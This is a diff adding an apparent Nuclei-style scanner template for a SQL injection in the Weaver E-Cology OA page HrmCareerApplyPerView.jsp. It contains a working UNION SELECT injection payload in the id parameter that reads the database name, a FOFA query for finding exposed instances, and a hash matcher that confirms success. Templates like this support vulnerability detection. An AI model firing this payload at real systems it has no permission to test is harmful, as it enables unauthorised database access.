@@ -1,0 +1,36 @@
+id: poc-local-oa-weaver-ecology-HrmCareerApplyPerView-sqli
+
+info:
+  name: 泛微OA E-Cology HrmCareerApplyPerView.jsp SQL注入漏洞
+  author: capiton
+  severity: high
+  description: 泛微OA E-Cology HrmCareerApplyPerView.jsp 文件存在SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库敏感文件
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20E-Cology%20HrmCareerApplyPerView.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    fofa-query: app="泛微-协同办公OA"
+    Vulnerability-Impact: unknown
+  tags: weaver,ecology,fanwei
+
+variables:
+    randInt: "{{rand_int(10000, 99999)}}"
+    md5_randInt: "{{md5(randInt)}}"
+    # res: '{{to_number(r1) * to_number(r2)}}'
+
+requests:
+  - method: GET
+    path:
+      - "{{RootURL}}/pweb/careerapply/HrmCareerApplyPerView.jsp?id=1%20union%20select%201%2C2%2Csys.fn_sqlvarbasetostr(HashBytes(%27MD5%27%2C%27{{randInt}}%27))%2Cdb_name(1)%2C5%2C6%2C7"
+
+    matchers-condition: and
+    matchers:
+      # - type: status
+      #   condition: and
+      #   status:
+      #     - 200
+
+      - type: word
+        part: body
+        condition: and   
+        words:  
+          - "{{md5_randInt}}"
